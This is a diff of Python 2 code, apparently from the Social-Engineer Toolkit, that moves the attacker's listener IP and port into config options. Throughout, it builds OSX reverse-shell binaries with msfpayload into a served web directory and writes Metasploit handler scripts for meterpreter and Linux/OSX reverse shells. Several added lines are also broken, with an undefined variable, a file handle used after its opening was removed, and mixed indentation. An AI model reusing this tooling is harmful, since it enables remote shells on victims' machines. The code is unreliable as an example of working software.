@@ -143,31 +143,26 @@ ipquestion=""
 # grab ipaddr if it hasn't been identified yet
 ####################################################################################################################################
 
-if not os.path.isfile("src/program_junk/ipaddr.file"):
-    filewrite=file("src/program_junk/ipaddr.file","w")
-    fileopen=file("config/set_config", "r").readlines()
-    for line in fileopen:
-        line=line.rstrip()
-        match=re.search("AUTO_DETECT=ON", line)
-        if match:
+if check_options("IPADDR=") == 0:
+    fileopen=file("config/set_config", "r")
+    data = fileopen.read()
+    match = re.search("AUTO_DETECT=ON", line)
+    if match:
             try:
                 ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 ipaddr.connect(('google.com', 0))
                 ipaddr.settimeout(2)
                 ipaddr=ipaddr.getsockname()[0]
-                filewrite.write(ipaddr)
-                filewrite.close()
+		update_options("IPADDR=" + ipaddr)		
+
             except Exception,e:
                 log(e)
                 ipaddr=raw_input(setprompt(["4"], "IP address for the payload listener"))
-                filewrite.write(ipaddr)
-                filewrite.close()
+		update_options("IPADDR=" + ipaddr)
 
     # if AUTO_DETECT=OFF prompt for IP Address
-    for line in fileopen:
-        line=line.rstrip()
-        match=re.search("AUTO_DETECT=OFF", line)
-        if match:
+    match=re.search("AUTO_DETECT=OFF", data)
+    if match:
             ipaddr=raw_input(setprompt(["4"], "Enter the IP address for the payload (reverse)"))
             filewrite.write(ipaddr)
             filewrite.close()
@@ -350,15 +345,11 @@ try:
                 encode = encode.replace("x86/", "")
 
         # Specify Remote Host if ipaddr.file is missing (should never get here)
-        if not os.path.isfile("src/program_junk/ipaddr.file"):
+ 	if check_options("IPADDR=") == 0:
             choice2=raw_input(setprompt(["4"], "IP Address of the listener/attacker (reverse) or host/victim (bind shell)"))
-            filewrite=file("src/program_junk/ipaddr.file","w")
-            filewrite.write(choice2)
-            filewrite.close()
-        fileopen=file("src/program_junk/ipaddr.file" , "r").readlines()
-        for line in fileopen:
-            line=line.rstrip()
-            choice2=line
+	    update_options("IPADDR=" + choice2)
+
+	choice2 = check_options("IPADDR=")
 
         # grab interface ip address
         if os.path.isfile("src/program_junk/interface"):
@@ -373,9 +364,7 @@ try:
 	            choice3=raw_input(setprompt(["4"], "PORT of the listener [443]"))
         if choice3 == '': choice3 = '443'
         # this is needed for the set_payload
-        filewrite = file ("%s/src/program_junk/port.options" % (definepath), "w")
-        filewrite.write(choice3)
-        filewrite.close()
+	update_options("PORT=" + choice3)
 
         # if we are using the SET interactive shell then do this
         if choice1 == "set/reverse_shell":
@@ -581,8 +570,10 @@ try:
 				secret = base64.b64encode(secret)
 				data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
                         filewrite.write(data)
+
                         # close file
                         filewrite.close()
+
                         # rename file
 			if choice1 == "shellcode/alphanum":
 	                        print_status("Prepping website for alphanumeric injection..")
@@ -593,9 +584,9 @@ try:
 		    if choice9 == "windows/meterpreter/reverse_tcp_allports": 
 			portnum = "LPORT=1"
 			choice3 = "1"
-			filewrite = file("%s/src/program_junk/port.options" % (definepath), "w")
-			filewrite.write("1")
-			filewrite.close()
+
+			# UPDATE THE SET CONFIG OPTIONS
+			update_options("PORT=1")
 
 		    # here we specify the payload name thats stored later on
 		    choice1 = choice9
@@ -688,7 +679,7 @@ try:
 		# if we are using the multiattack, there will be port conflicts, need to scoot it to 8082
 		if attack_vector == "multiattack":
 			port1 = "8082"
-		if check_config("DEPLOY_OSX_LINUX_PAYLOADS=") == "ON":
+		if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
 	                port2=check_config("LINUX_REVERSE_PORT=")
         	        print_status("Generating OSX payloads through Metasploit...")
                 	subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/mac.bin;chmod 755 %s/src/html/mac.bin" % (path,choice2,port1,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
@@ -702,7 +693,13 @@ try:
         # try block here
         try:
             # if they want a listener, start here
-            filewrite=file("%s/src/program_junk/meta_config" % (definepath), "w")
+	    if os.path.isfile("%s/src/program_junk/meta_config" % (definepath)):
+	    	    # if its already created
+	            filewrite=file("%s/src/program_junk/meta_config" % (definepath), "a")
+
+	    if not os.path.isfile("%s/src/program_junk/meta_config" % (definepath)):
+		    # if we need to create it
+		    filewrite = file("%s/src/program_junk/meta_config" % (definepath), "w")
 
             # if there isn't a multiattack metasploit, setup handler
             if not os.path.isfile("%s/src/program_junk/multi_meta" % (definepath)):
@@ -714,6 +711,7 @@ try:
                     filewrite.write("set LPORT "+choice3+"\n")
 
                 filewrite.write("set ExitOnSession false\n")
+
                 if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
 
@@ -735,24 +733,25 @@ try:
 
             # Define linux and OSX payloads
             if payloadgen == "regular":
-                filewrite.write("use exploit/multi/handler\n")
-                filewrite.write("set PAYLOAD osx/x86/shell_reverse_tcp" +"\n")
-                filewrite.write("set LHOST "+choice2+"\n")
-                filewrite.write("set LPORT "+port1+"\n")
-                filewrite.write("set ExitOnSession false\n")
-                filewrite.write("exploit -j\n\n")
-                filewrite.write("use exploit/multi/handler\n")
-                filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
-                filewrite.write("set LHOST "+choice2+"\n")
-                filewrite.write("set LPORT "+port2+"\n")
-                if linux_meterpreter_multi == "ON":
-                    multiwrite=file("src/program_junk/lin_multi_meter.file", "w")
-                    multiwrite.write(linux_meterpreter_multi_command)        
-                    filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/lin_multi_meter.file\n" % (definepath))
-                    multiwrite.close()
-                filewrite.write("set ExitOnSession false\n")
-                filewrite.write("exploit -j\n\n")                
-                filewrite.close()
+		if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
+	                filewrite.write("use exploit/multi/handler\n")
+	                filewrite.write("set PAYLOAD osx/x86/shell_reverse_tcp" +"\n")
+	                filewrite.write("set LHOST "+choice2+"\n")
+	                filewrite.write("set LPORT "+port1+"\n")
+	                filewrite.write("set ExitOnSession false\n")
+	                filewrite.write("exploit -j\n\n")
+	                filewrite.write("use exploit/multi/handler\n")
+	                filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
+	                filewrite.write("set LHOST "+choice2+"\n")
+	                filewrite.write("set LPORT "+port2+"\n")
+	                if linux_meterpreter_multi == "ON":
+	                    multiwrite=file("src/program_junk/lin_multi_meter.file", "w")
+	                    multiwrite.write(linux_meterpreter_multi_command)        
+	                    filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/lin_multi_meter.file\n" % (definepath))
+	                    multiwrite.close()
+		            filewrite.write("set ExitOnSession false\n")
+	                filewrite.write("exploit -j\n\n")               
+            filewrite.close()
 
 
         except Exception, e:
